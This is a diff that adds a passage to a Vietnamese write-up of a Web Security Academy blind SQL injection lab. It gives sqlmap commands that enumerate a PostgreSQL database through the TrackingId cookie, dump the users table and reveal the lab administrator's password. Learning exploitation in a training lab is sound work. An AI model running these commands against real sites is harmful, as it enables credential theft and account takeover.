@@ -182,7 +182,39 @@ Ta tìm được độ dài của password là 20. Tiếp tục cho vào burp in
 
 
 
+Tương tự ta dùng sqlmap để giải: 
 
+> payload:  sqlmap -u "https://0a1d00120454efcbc020e5f8000d0071.web-security-academy.net/filter?category=Lifestyle" --cookie="TrackingId=JHeMMMt7qJmqCCdn*;" -p "TracingId" --proxy http://127.0.0.1:8080 --dbs -batch 
+
+![image](https://user-images.githubusercontent.com/104350480/221622642-f2fc5924-5365-4a6c-bf9d-f92c923d0b69.png)
+
+Có dbms=PostgreSQL và tên database là public. Tìm table
+
+> payload: sqlmap -u "https://0a1d00120454efcbc020e5f8000d0071.web-security-academy.net/filter?category=Lifestyle" --cookie="TrackingId=JHeMMMt7qJmqCCdn*;" -p "TracingId" --proxy http://127.0.0.1:8080 --dbms=PostgreSQL --tables --threads=10 -batch
+
+![image](https://user-images.githubusercontent.com/104350480/221623117-be978b20-1120-454e-84df-538be78bddb9.png)
+
+Có 2 table, ta fuzz table users, tiếp tục tìm cột: 
+
+> payload: sqlmap -u "https://0a1d00120454efcbc020e5f8000d0071.web-security-academy.net/filter?category=Lifestyle" --cookie="TrackingId=JHeMMMt7qJmqCCdn*;" -p "TracingId" --proxy http://127.0.0.1:8080 --dbms=PostgreSQL -D public -T users --column --threads=10 -batch
+
+Ta được 2 cột trả về là username và password:
+
+![image](https://user-images.githubusercontent.com/104350480/221623390-40150047-ba57-4ba1-b1c7-9565f149d2f9.png)
+
+Tiếp tục fuzz cột username: 
+
+> payload: sqlmap -u "https://0a1d00120454efcbc020e5f8000d0071.web-security-academy.net/filter?category=Lifestyle" --cookie="TrackingId=JHeMMMt7qJmqCCdn*;" -p "TracingId" --proxy http://127.0.0.1:8080 --dbms=PostgreSQL -D public -T users -C username --dump --threads=10 -batch
+
+![image](https://user-images.githubusercontent.com/104350480/221623663-5aad9aeb-708e-4814-b432-785a739f6f40.png)
+
+Cuối cùng là password:
+
+> payload: sqlmap -u "https://0a1d00120454efcbc020e5f8000d0071.web-security-academy.net/filter?category=Lifestyle" --cookie="TrackingId=JHeMMMt7qJmqCCdn*;" -p "TracingId" --proxy http://127.0.0.1:8080 --dbms=PostgreSQL -D public -T users -C password --dump --threads=10 -batch
+
+![image](https://user-images.githubusercontent.com/104350480/221623907-5741eab2-7d90-420d-b1d3-922d1d274327.png)
+
+#### Ta cũng có được password của administrator là: rnhh118d91xe1e3raoee
 
 
 
